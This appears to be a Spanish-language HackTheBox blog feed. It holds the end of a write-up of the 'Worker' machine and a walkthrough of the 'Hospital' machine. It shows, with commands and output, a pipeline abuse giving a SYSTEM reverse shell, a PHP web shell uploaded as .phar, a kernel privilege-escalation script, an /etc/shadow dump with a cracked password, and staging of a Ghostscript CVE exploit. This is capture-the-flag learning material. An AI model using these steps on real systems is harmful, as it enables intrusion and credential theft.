NT AUTHORITY<span class="se">\N</span>TLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\M</span>edium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>Si recordamos tenemos credenciales y si nos conectamos al <code class="language-plaintext highlighter-rouge">devops.worker.htb</code> con las credenciales son validas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/19.png" />
</p>

<ul>
  <li>Formamos parte del grupo <code class="language-plaintext highlighter-rouge">Build Administrators</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/20.png" />
</p>

<ul>
  <li>
    <p>Podemos crear un <code class="language-plaintext highlighter-rouge">Pipeline</code>.</p>
  </li>
  <li>
    <p>Después le damos en <code class="language-plaintext highlighter-rouge">PartsUnlimited</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/21.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/22.png" />
</p>

<ul>
  <li>
    <p>Podemos hacer un script en YAML.</p>
  </li>
  <li>
    <p>Si vemos en la parte de script se están ejecutando comandos podemos hacer un <code class="language-plaintext highlighter-rouge">whoami</code> para ver quien es el que esta ejecutando el script.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Save and Rune</code> vemos el mismo problema que teníamos antes.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/23.png" />
</p>

<ul>
  <li>Así que vamos a crear una nueva rama.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/24.png" />
</p>

<ul>
  <li>Pero obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/25.png" />
</p>

<ul>
  <li>Vemos que nos dicen sobre el <code class="language-plaintext highlighter-rouge">pool</code> que no existe default a si que tenemos que buscar uno que exista.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/26.png" />
</p>

<ul>
  <li>Vamos a cambiar el <code class="language-plaintext highlighter-rouge">pool</code> y hacemos lo mismo de cambiar la rama.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/27.png" />
</p>

<ul>
  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Run</code> vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/28.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> al <code class="language-plaintext highlighter-rouge">#....</code> vemos que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/29.png" />
</p>

<ul>
  <li>
    <p>Vamos a editar el <code class="language-plaintext highlighter-rouge">Pipeline</code> para hacer todo lo anterior y enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
  <li>
    <p>En mi caso volví a subir el <code class="language-plaintext highlighter-rouge">nc.exe</code> así que nos enviamos una reverse ahora.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/30.png" />
</p>

<ul>
  <li>
    <p>Hacemos todo el proceso de antes de crear una nueva rama.</p>
  </li>
  <li>
    <p>Después de que se procese todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 49935
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
d3a78316ac7f36f03c0e6dd2ada48da9
C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Hospital (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html" rel="alternate" type="text/html" title="HackTheBox - Hospital (medium)" /><published>2024-05-12T00:00:00-06:00</published><updated>2024-05-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e980d18b909fa0ba8f519cf9777fd413.png" />
</p>

<ul>
  <li>Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a RoundCube instance. The web application has a file upload vulnerability that allows the execution of arbitrary PHP code, leading to a reverse shell on the Linux virtual machine hosting the service. Enumerating the system reveals an outdated Linux kernel that can be exploited to gain root privileges, via CVE-2023-35001. Privileged access allows /etc/shadow hashes to be read and subsequently cracked, yielding credentials for the RoundCube instance. Emails on the service hint towards the use of GhostScript, which opens up the target to exploitation via , a vulnerability exploited by crafting a malicious Embedded PostScript (EPS) file to achieve remote code execution on the Windows host. System access is then obtained by either of two ways: using a keylogger to capture administrator credentials, or by abusing misconfigured XAMPP permissions.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo TCP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6616,6631,6647,9389 10.10.11.241 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-11 15:32 CST
Nmap scan report <span class="k">for </span>10.10.11.241
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-05-12 04:32:45Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-12T04:33:41+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Not valid before: 2024-05-10T04:42:39
|_Not valid after:  2024-11-09T04:42:39
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6616/tcp open  msrpc             Microsoft Windows RPC
6631/tcp open  msrpc             Microsoft Windows RPC
6647/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   <span class="nb">date</span>: 2024-05-12T04:33:44
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar los nombres de dominio que nos dio <code class="language-plaintext highlighter-rouge">Nmap</code> también que prácticamente son los mismos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.241 DC.hospital.htb hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.241 DC.hospital.htb hospital.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.241 <span class="nt">--shares</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>-] Error enumerating shares: <span class="o">[</span>Errno 32] Broken pipe
➜  nmap cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'admin'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>-] hospital.htb<span class="se">\a</span>dmin: STATUS_LOGON_FAILURE
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.241 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.241
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>En el puerto 443 vemos un panel de <code class="language-plaintext highlighter-rouge">login</code> credenciales por defecto no funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/1.png" />
</p>

<ul>
  <li>En el puerto <code class="language-plaintext highlighter-rouge">8080</code> tenemos un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/2.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear una cuenta ya que no tenemos una para conectarnos.</p>
  </li>
  <li>
    <p>Una vez tenemos nuestra cuenta nos podemos conectar y algo ya que llama la atención es la parte de subir archivos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/3.png" />
</p>

<ul>
  <li>Como la pagina web interpreta <code class="language-plaintext highlighter-rouge">php</code> podemos intentar subir <code class="language-plaintext highlighter-rouge">.php</code> para ver si funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"&lt;?php system("</span><span class="nb">id</span><span class="s2">"); ?&gt;"</span> <span class="o">&gt;</span> test.php
</code></pre></div></div>

<ul>
  <li>Al subirlo me da error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/4.png" />
</p>

<ul>
  <li>
    <p>Vamos a probar con un <code class="language-plaintext highlighter-rouge">jpg</code>.</p>
  </li>
  <li>
    <p>Y funciona.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/5.png" />
</p>

<ul>
  <li>Vamos a ver si existe la ruta donde se suban las cosas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  content gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hospital.htb:8080/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://hospital.htb:8080/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/images/]
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/uploads/]
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/css/]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/js/]
/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/vendor/]
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/fonts/]
</code></pre></div></div>

<ul>
  <li>Y bueno lo mas probable es que no podremos ver nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/6.png" />
</p>

<ul>
  <li>
    <p>Lo que vamos hacer es capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> y ver que otras extensiones podemos usar para interpretar código <code class="language-plaintext highlighter-rouge">php</code>.</p>
  </li>
  <li>
    <p>Vamos a <code class="language-plaintext highlighter-rouge">fuzzear</code> por la extensión en el <code class="language-plaintext highlighter-rouge">intruder</code> de momento dejamos estas.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/7.png" />
</p>

<ul>
  <li>Si observamos la respuesta en <code class="language-plaintext highlighter-rouge">.phar</code> vemos que nos un <code class="language-plaintext highlighter-rouge">success.php</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/8.png" />
</p>

<blockquote>
  <p>En el software, un archivo PHAR es un formato de paquete que permite la distribución de aplicaciones y bibliotecas al agrupar muchos archivos de código PHP y otros recursos en un solo archivo.</p>
</blockquote>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>Ahora lo que vamos hacer es subir lo siguiente <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> pero lo pondremos en <code class="language-plaintext highlighter-rouge">.phar</code> para que pueda interpretarlo y así estar mas cómodos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/flozz/p0wny-shell
Cloning into <span class="s1">'p0wny-shell'</span>...
remote: Enumerating objects: 215, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>137/137<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>54/54<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 215 <span class="o">(</span>delta 94<span class="o">)</span>, reused 110 <span class="o">(</span>delta 82<span class="o">)</span>, pack-reused 78
Receiving objects: 100% <span class="o">(</span>215/215<span class="o">)</span>, 117.41 KiB | 626.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>124/124<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>p0wny-shell
➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Dockerfile  LICENSE  README.md  RELEASE.rst  screenshot.png  shell.php
➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">mv </span>shell.php shell.phar
</code></pre></div></div>

<ul>
  <li>Después de subir el <code class="language-plaintext highlighter-rouge">.phar</code> como ya sabemos el nombre y la ruta donde guarda los archivos ya podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/9.png" />
</p>

<ul>
  <li>Ahora nos vamos enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/10.png" />
</p>

<ul>
  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6602
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>974<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@webserver:/var/www/html/uploads<span class="err">$</span>
</code></pre></div></div>

<h2 id="root">Root</h2>

<ul>
  <li>La versión del <code class="language-plaintext highlighter-rouge">kernel</code> es vieja y es vulnerable <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html/uploads<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-r</span>
5.19.0-35-generic
www-data@webserver:/var/www/html/uploads<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Al ejecutar el script nos convertiremos en <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x exploit.sh
www-data@webserver:/tmp<span class="nv">$ </span>./exploit.sh
<span class="o">[</span>+] You should be root now
<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
root@webserver:/tmp#
</code></pre></div></div>

<ul>
  <li>No hay nada interesante como una flag ni nada pero como somos <code class="language-plaintext highlighter-rouge">root</code> y el usuario <code class="language-plaintext highlighter-rouge">drwilliams</code> existe podemos ver el <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@webserver:/home/drwilliams# <span class="nb">cat</span> /etc/shadow

root:<span class="nv">$y$j9T$s</span>/Aqv48x449udndpLC6eC.<span class="nv">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:<span class="k">*</span>:19462:0:99999:7:::
bin:<span class="k">*</span>:19462:0:99999:7:::
sys:<span class="k">*</span>:19462:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:19462:0:99999:7:::
games:<span class="k">*</span>:19462:0:99999:7:::
man:<span class="k">*</span>:19462:0:99999:7:::
lp:<span class="k">*</span>:19462:0:99999:7:::
mail:<span class="k">*</span>:19462:0:99999:7:::
news:<span class="k">*</span>:19462:0:99999:7:::
uucp:<span class="k">*</span>:19462:0:99999:7:::
proxy:<span class="k">*</span>:19462:0:99999:7:::
www-data:<span class="k">*</span>:19462:0:99999:7:::
backup:<span class="k">*</span>:19462:0:99999:7:::
list:<span class="k">*</span>:19462:0:99999:7:::
irc:<span class="k">*</span>:19462:0:99999:7:::
_apt:<span class="k">*</span>:19462:0:99999:7:::
nobody:<span class="k">*</span>:19462:0:99999:7:::
systemd-network:!<span class="k">*</span>:19462::::::
systemd-timesync:!<span class="k">*</span>:19462::::::
messagebus:!:19462::::::
systemd-resolve:!<span class="k">*</span>:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:<span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
root@webserver:/home/drwilliams#
</code></pre></div></div>

<h2 id="shell-as-drbrown">Shell as drbrown</h2>

<ul>
  <li>Obtenemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 512/512 AVX512BW 8x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
qwe123!@#        <span class="o">(</span>drwilliams<span class="o">)</span>
1g 0:00:01:04 DONE <span class="o">(</span>2024-05-11 16:52<span class="o">)</span> 0.01554g/s 3334p/s 3334c/s 3334C/s raycharles..pl@yboy
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Podemos usar las credenciales en el panel de administración.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/11.png" />
</p>

<ul>
  <li>Vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/12.png" />
</p>

<ul>
  <li>Encontramos información útil.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/13.png" />
</p>

<blockquote>
  <p>PostScript encapsulado, o EPS, es un formato de archivo gráfico. Un archivo EPS es un archivo PostScript que satisface algunas restricciones adicionales. Estas restricciones intentan hacer más fácil a programas de software el incluir un archivo EPS dentro de otro documento PostScript.</p>
</blockquote>

<ul>
  <li>El Dr. Brown quiere que le enviemos un archivo con la extensión <code class="language-plaintext highlighter-rouge">.eps</code>  y nos habla sobre <a href="https://www.ghostscript.com/">https://www.ghostscript.com/</a> que es el que interpreta el <code class="language-plaintext highlighter-rouge">PostScript</code> si investigamos sobre esto encontramos una vulnerabilidad en <code class="language-plaintext highlighter-rouge">Ghostscript</code> <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a> en la que podemos hacer una inyección de comandos en un <code class="language-plaintext highlighter-rouge">.eps</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
Cloning into <span class="s1">'CVE-2023-36664-Ghostscript-command-injection'</span>...
remote: Enumerating objects: 34, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 34 <span class="o">(</span>delta 15<span class="o">)</span>, reused 5 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 0
Receiving objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, 71.69 KiB | 407.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>15/15<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>CVE-2023-36664-Ghostscript-command-injection
➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>CVE_2023_36664_exploit.py  README.md  file.eps  file.ps  flowchart.png  vsociety.jpg
➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> python3 CVE_2023_36664_exploit.py
<span class="o">[</span>-] Either <span class="nt">--payload</span> or <span class="nt">--revshell</span> is required.
</code></pre></div></div>

<ul>
  <li>Para ganar acceso necesitamos subir el ejecutable de <code class="language-plaintext highlighter-rouge">netcat</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

</code></pre></div></div>

